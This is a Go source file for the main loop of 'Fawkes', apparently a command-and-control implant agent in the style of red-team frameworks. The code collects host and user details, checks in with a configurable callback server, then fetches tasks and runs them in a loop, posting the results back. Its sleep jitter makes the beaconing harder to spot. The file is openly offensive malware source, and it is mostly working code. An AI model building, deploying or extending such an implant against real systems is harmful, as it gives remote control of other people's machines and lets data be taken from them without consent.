package main

import (
	"context"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/google/uuid"

	"fawkes/pkg/commands"
	"fawkes/pkg/http"
	"fawkes/pkg/profiles"
	"fawkes/pkg/structs"
)

var (
	// These variables are populated at build time by the Go linker
	payloadUUID        string = ""
	c2Profile          string = ""
	callbackHost       string = ""
	callbackPort       string = "443"
	userAgent         string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	sleepInterval     string = "10"
	jitter            string = "10"
	encryptionKey     string = ""
	killDate          string = "0"
	maxRetries        string = "10"
	debug             string = "false"
	endpointURI       string = "/data"
)

func main() {
	// Convert string build variables to appropriate types
	callbackPortInt, _ := strconv.Atoi(callbackPort)
	sleepIntervalInt, _ := strconv.Atoi(sleepInterval)
	jitterInt, _ := strconv.Atoi(jitter)
	killDateInt64, _ := strconv.ParseInt(killDate, 10, 64)
	maxRetriesInt, _ := strconv.Atoi(maxRetries)
	debugBool, _ := strconv.ParseBool(debug)

	// Setup logging
	if debugBool {
		log.SetOutput(os.Stdout)
		log.Println("[DEBUG] Starting Fawkes agent")
	}

	// Verify required configuration
	if payloadUUID == "" {
		payloadUUID = uuid.New().String()
		log.Printf("[WARNING] No payload UUID provided, generated: %s", payloadUUID)
	}

	// Check kill date
	if killDateInt64 > 0 && time.Now().Unix() > killDateInt64 {
		log.Printf("[INFO] Agent past kill date, exiting")
		os.Exit(0)
	}

	// Initialize the agent
	agent := &structs.Agent{
		PayloadUUID:     payloadUUID,
		Architecture:    "x64",  // This should be set at build time
		Domain:          "",
		ExternalIP:      "",
		Host:            getHostname(),
		Integrity:       3,
		InternalIP:      getInternalIP(),
		OS:              getOperatingSystem(),
		PID:             os.Getpid(),
		ProcessName:     os.Args[0],
		SleepInterval:   sleepIntervalInt,
		Jitter:         jitterInt,
		User:           getUsername(),
		Description:    fmt.Sprintf("Fawkes agent %s", payloadUUID[:8]),
	}

	// Initialize HTTP profile
	// Construct callback URL properly - check if callbackHost already has protocol
	var callbackURL string
	if strings.HasPrefix(callbackHost, "http://") || strings.HasPrefix(callbackHost, "https://") {
		callbackURL = fmt.Sprintf("%s:%d", callbackHost, callbackPortInt)
	} else {
		callbackURL = fmt.Sprintf("http://%s:%d", callbackHost, callbackPortInt)
	}
	
	httpProfile := http.NewHTTPProfile(
		callbackURL,
		userAgent,
		encryptionKey,
		maxRetriesInt,
		sleepIntervalInt,
		jitterInt,
		debugBool,
		endpointURI,
	)

	// Initialize C2 profile
	c2 := profiles.NewProfile(httpProfile)

	// Initialize command handlers
	commands.Initialize()

	// Initial checkin
	log.Printf("[INFO] Starting initial checkin...")
	if err := c2.Checkin(agent); err != nil {
		log.Printf("[ERROR] Initial checkin failed: %v", err)
		return
	}
	log.Printf("[INFO] Initial checkin successful")

	// Create context for graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Handle signals for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		sig := <-sigChan
		log.Printf("[INFO] Received signal: %v, shutting down gracefully", sig)
		cancel()
	}()

	// Start main execution loop
	var wg sync.WaitGroup
	wg.Add(1)

	go func() {
		defer wg.Done()
		mainLoop(ctx, agent, c2, maxRetriesInt, sleepIntervalInt, debugBool)
	}()

	// Wait for shutdown signal or completion
	wg.Wait()
	log.Printf("[INFO] Fawkes agent shutdown complete")
}

func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, maxRetriesInt int, sleepIntervalInt int, debugBool bool) {
	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])

	// Main execution loop
	retryCount := 0
	for {
		if debugBool {
			log.Printf("[DEBUG] Starting main loop iteration, retryCount=%d", retryCount)
		}
		select {
		case <-ctx.Done():
			log.Printf("[INFO] Context cancelled, exiting main loop")
			return
		default:
			if debugBool {
				log.Printf("[DEBUG] Calling GetTasking...")
			}
			// Get tasks from C2 server
			tasks, err := c2.GetTasking(agent)
			if err != nil {
				log.Printf("[ERROR] Failed to get tasking: %v", err)
				retryCount++
				if retryCount >= maxRetriesInt {
					log.Printf("[ERROR] Maximum retry count reached, exiting")
					return
				}
				// Use the same sleep calculation for error case
				sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
				if debugBool {
					log.Printf("[DEBUG] Sleeping for %v after error", sleepTime)
				}
				time.Sleep(sleepTime)
				continue
			}

			// Reset retry count on successful communication
			retryCount = 0
			if debugBool {
				log.Printf("[DEBUG] GetTasking successful, received %d tasks", len(tasks))
			}

			// Process tasks
			for _, task := range tasks {
				response := processTask(task)
				if err := c2.PostResponse(response, agent); err != nil {
					log.Printf("[ERROR] Failed to post response: %v", err)
				}
			}

			// Sleep before next iteration
			sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
			if debugBool {
				log.Printf("[DEBUG] Sleeping for %v before next check", sleepTime)
			}
			time.Sleep(sleepTime)
		}
	}
}

func processTask(task structs.Task) structs.Response {
	log.Printf("[INFO] Processing task: %s (ID: %s)", task.Command, task.ID)

	response := structs.Response{
		TaskID: task.ID,
	}

	// Get command handler
	handler := commands.GetCommand(task.Command)
	if handler == nil {
		response.Status = "error"
		response.UserOutput = fmt.Sprintf("Unknown command: %s", task.Command)
		response.Completed = true
		return response
	}

	// Execute command
	result := handler.Execute(task)
	response.UserOutput = result.Output
	response.Status = result.Status
	response.Completed = result.Completed

	return response
}

func calculateSleepTime(interval, jitter int) time.Duration {
	if jitter == 0 {
		return time.Duration(interval) * time.Second
	}

	// Freyja-style jitter calculation
	// Jitter is a percentage (0-100) that creates variation around the interval
	jitterFloat := float64(rand.Int()%jitter) / float64(100)
	jitterDiff := float64(interval) * jitterFloat

	// Randomly add or subtract jitter (50/50 chance)
	if rand.Int()%2 == 0 {
		// Add jitter
		actualInterval := interval + int(jitterDiff)
		return time.Duration(actualInterval) * time.Second
	} else {
		// Subtract jitter
		actualInterval := interval - int(jitterDiff)
		if actualInterval < 1 {
			actualInterval = 1 // Minimum 1 second
		}
		return time.Duration(actualInterval) * time.Second
	}
}

// Helper functions for system information
func getHostname() string {
	if hostname, err := os.Hostname(); err == nil {
		return hostname
	}
	return "unknown"
}

func getUsername() string {
	if user := os.Getenv("USER"); user != "" {
		return user
	}
	if user := os.Getenv("USERNAME"); user != "" {
		return user
	}
	return "unknown"
}

func getOperatingSystem() string {
	return fmt.Sprintf("%s", os.Getenv("GOOS"))
}

func getInternalIP() string {
	// This is simplified - should implement proper IP detection
	return "127.0.0.1"
}